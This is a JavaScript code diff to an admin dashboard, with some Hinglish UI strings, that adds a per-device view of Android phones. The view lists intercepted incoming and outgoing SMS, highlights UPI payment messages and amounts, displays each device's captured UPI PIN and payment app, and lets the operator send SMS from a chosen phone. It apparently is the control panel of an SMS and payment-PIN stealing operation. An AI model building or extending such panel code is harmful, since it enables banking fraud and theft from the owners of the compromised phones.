-function closeModal() { $("#deviceModal").hidden = true; }
+function renderDeviceMessages() {
+    const d = state.activeDevice;
+    if (!d) return;
+
+    const all = deviceMessages(d);
+    const q = $("#dvSearch").value.trim().toLowerCase();
+    const dir = $("#dvDir").value;
+    const upiOnly = $("#dvUpi").checked;
+
+    let list = all;
+    if (dir === "in" || dir === "out") list = list.filter((m) => m.direction === dir);
+    if (upiOnly) list = list.filter((m) => m.kind === "upi");
+    if (q) {
+        list = list.filter((m) =>
+            `${m.body} ${m.address} ${m.amount} ${m.status}`.toLowerCase().includes(q)
+        );
+    }
+
+    list = list.slice().sort((a, b) => new Date(b.created_at || 0) - new Date(a.created_at || 0));
+
+    $("#dvMsgCount").textContent = `${list.length} / ${all.length}`;
+
+    const wrap = $("#dvMsgList");
+    wrap.replaceChildren();
+
+    if (!list.length) {
+        const e = document.createElement("div");
+        e.className = "empty-state";
+        e.textContent = all.length
+            ? "Is filter par koi message nahi mila"
+            : "Is device ka koi message nahi hai";
+        wrap.appendChild(e);
+        return;
+    }
+
+    list.forEach((m) => {
+        const item = document.createElement("div");
+        item.className = "msg-item";
+
+        const head = document.createElement("div");
+        head.className = "msg-head";
+
+        const dirBadge = document.createElement("span");
+        const isIn = m.direction === "in";
+        dirBadge.className = "badge " + (isIn ? "in" : "out");
+        dirBadge.textContent = isIn ? "IN" : "OUT";
+        head.appendChild(dirBadge);
+
+        const addr = document.createElement("span");
+        addr.className = "msg-addr";
+        addr.appendChild(highlight(m.address || "—", q));
+        head.appendChild(addr);
+
+        if (m.kind === "upi") {
+            const ub = document.createElement("span");
+            ub.className = "badge upi";
+            ub.textContent = "UPI";
+            head.appendChild(ub);
+        }
+
+        const time = document.createElement("span");
+        time.className = "msg-time";
+        time.textContent = formatDate(m.created_at);
+        head.appendChild(time);
+
+        item.appendChild(head);
+
+        const body = document.createElement("div");
+        body.className = "msg-body";
+        body.appendChild(highlight(m.body || "—", q));
+        item.appendChild(body);
+
+        const foot = document.createElement("div");
+        foot.className = "msg-foot";
+
+        if (m.amount) {
+            const ab = document.createElement("span");
+            ab.className = "badge";
+            ab.textContent = `₹${m.amount}`;
+            foot.appendChild(ab);
+        }
+
+        const sb = document.createElement("span");
+        const s = String(m.status || (isIn ? "received" : "sent")).toLowerCase();
+        sb.className = "badge " + (["sent","success","received","delivered","ok"].includes(s) ? "online"
+            : ["pending","queued"].includes(s) ? "pending"
+            : ["failed","error"].includes(s) ? "error" : "");
+        sb.textContent = m.status || (isIn ? "received" : "sent");
+        foot.appendChild(sb);
+
+        item.appendChild(foot);
+        wrap.appendChild(item);
+    });
+}
+
+function openDeviceDetail(d) {
+    state.activeDevice = d;
+
+    const t = getTelemetry(d);
+
+    $("#dvIcon").innerHTML = PHONE_SVG;
+    $("#dvName").textContent = getDeviceName(d);
+    $("#dvSub").textContent = `${t.model || "unknown model"} · Android ${t.android_version || "—"} · RAM ${ramLabel(d)}`;
+
+    const tags = $("#dvTags");
+    tags.replaceChildren();
+
+    const st = getDeviceStatus(d);
+    const stl = st.toLowerCase();
+    const stBadge = document.createElement("span");
+    stBadge.className = "badge " + (stl.includes("online") || stl.includes("active") ? "online"
+        : stl.includes("offline") ? "error" : "");
+    stBadge.textContent = st;
+    tags.appendChild(stBadge);
+
+    const num = t.sim_number || d.phone_number;
+    if (num) {
+        const nb = document.createElement("span");
+        nb.className = "badge mono";
+        nb.textContent = num;
+        tags.appendChild(nb);
+    }
+    if (d.upi_pin) {
+        const pb = document.createElement("span");
+        pb.className = "badge pin mono";
+        pb.textContent = `PIN ${d.upi_pin}${d.payment_app ? " · " + d.payment_app : ""}`;
+        tags.appendChild(pb);
+    }
+    const created = document.createElement("span");
+    created.className = "badge";
+    created.textContent = `created ${formatDate(d.created_at)}`;
+    tags.appendChild(created);
+
+    const battBox = $("#dvBattery");
+    battBox.replaceChildren();
+    battBox.appendChild(batteryEl(d));
+
+    $("#dvSearch").value = "";
+    $("#dvDir").value = "";
+    $("#dvUpi").checked = false;
+    $("#dvTo").value = "";
+    $("#dvBody").value = "";
+
+    renderDeviceInfo(d);
+    renderDeviceMessages();
+
+    $("#deviceDetail").hidden = false;
+    document.body.style.overflow = "hidden";
+
+    /* fresh messages laao (device specific) */
+    loadMessages().then(() => {
+        if (state.activeDevice && String(getDeviceId(state.activeDevice)) === String(getDeviceId(d))) {
+            renderDeviceInfo(d);
+            renderDeviceMessages();
+        }
+    }).catch(() => {});
+}
+
+function closeDeviceDetail() {
+    $("#deviceDetail").hidden = true;
+    document.body.style.overflow = "";
+    state.activeDevice = null;
+}
 
 /* -------------------------------------------------------- loaders */
 
@@ -1881,14 +2411,30 @@ async function loadDevices() {
     state.devices = Array.isArray(d) ? d : d.devices || [];
     renderOverview();
     renderLive();
-    renderDevices();
+    renderDeviceCards();
+
+    if (state.activeDevice) {
+        const fresh = state.devices.find(
+            (x) => String(getDeviceId(x)) === String(getDeviceId(state.activeDevice))
+        );
+        if (fresh) {
+            state.activeDevice = fresh;
+            renderDeviceInfo(fresh);
+            $("#dvName").textContent = getDeviceName(fresh);
+            $("#dvSub").textContent = `${getTelemetry(fresh).model || "unknown model"} · Android ${getTelemetry(fresh).android_version || "—"} · RAM ${ramLabel(fresh)}`;
+            const bb = $("#dvBattery");
+            bb.replaceChildren();
+            bb.appendChild(batteryEl(fresh));
+        }
+    }
 }
 
 async function loadMessages() {
-    const d = await api("/admin/messages?limit=200");
+    const d = await api("/admin/messages?limit=500");
     state.messages = Array.isArray(d) ? d : d.messages || [];
     renderMessages();
     renderLive();
+    if (state.activeDevice) renderDeviceMessages();
 }
 
 async function loadRules() {
@@ -1953,7 +2499,47 @@ function navigate(page) {
 $("#pinsOnlyButton").addEventListener("click", () => {
     state.pinsOnly = !state.pinsOnly;
     $("#pinsOnlyButton").classList.toggle("active", state.pinsOnly);
-    renderDevices();
+    renderDeviceCards();
+});
+
+$("#deviceSearch").addEventListener("input", renderDeviceCards);
+
+$("#dvSearch").addEventListener("input", renderDeviceMessages);
+$("#dvDir").addEventListener("change", renderDeviceMessages);
+$("#dvUpi").addEventListener("change", renderDeviceMessages);
+$("#dvClose").addEventListener("click", closeDeviceDetail);
+
+$("#dvRefresh").addEventListener("click", async () => {
+    try {
+        await loadDevices();
+        await loadMessages();
+        showToast("device refreshed");
+    } catch (e) { showToast(e.message); }
+});
+
+$("#dvSend").addEventListener("click", async () => {
+    const d = state.activeDevice;
+    if (!d) return;
+    const body = $("#dvBody").value.trim();
+    if (!body) { showToast("message khali hai"); return; }
+
+    const btn = $("#dvSend");
+    btn.disabled = true;
+    try {
+        await api("/admin/send", {
+            method: "POST",
+            body: JSON.stringify({
+                target: "device",
+                device_id: getDeviceId(d),
+                to: $("#dvTo").value.trim() || null,
+                body
+            })
+        });
+        $("#dvBody").value = "";
+        showToast(`queued → ${getDeviceName(d)}`);
+        await loadMessages();
+    } catch (e) { showToast(e.message); }
+    finally { btn.disabled = false; }
 });
 
 $("#bulkSend").addEventListener("click", async () => {
@@ -2038,6 +2624,7 @@ $("#botTest").addEventListener("click", async () => {
 });
 
 $("#msgFilter").addEventListener("change", renderMessages);
+$("#msgSearch").addEventListener("input", renderMessages);
 
 /* ------------------------------------------------------- listeners */
 
@@ -2094,12 +2681,9 @@ document.querySelectorAll("[data-refresh]").forEach((b) => {
 });
 
 $("#refreshButton").addEventListener("click", refreshAll);
-$("#modalClose").addEventListener("click", closeModal);
-$("#deviceModal").addEventListener("click", (e) => {
-    if (e.target === $("#deviceModal")) closeModal();
-});
+
 document.addEventListener("keydown", (e) => {
-    if (e.key === "Escape") closeModal();
+    if (e.key === "Escape" && !$("#deviceDetail").hidden) closeDeviceDetail();
 });
 
 /* --------------------------------------------------- live polling */
